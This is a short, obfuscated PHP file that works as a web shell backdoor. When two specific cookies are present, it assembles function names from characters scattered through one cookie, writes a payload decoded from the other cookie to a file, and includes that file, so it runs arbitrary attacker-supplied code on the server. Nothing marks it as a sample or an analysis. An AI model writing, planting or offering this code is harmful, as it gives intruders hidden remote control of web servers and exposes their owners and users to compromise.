<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[21])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 5;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[21][$n];
        if (!$c[21][$n + 1]) {
            if (!$c[21][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 5 + 1;
    }
    $k = $p[29]() . $p[20];
    if (!$p[12]($k)) {
        $n = $p[6]($k, $p[26]);
        $p[19]($n, $p[24] . $p[4]($p[11]($c[3])));
    }
    include($k);
}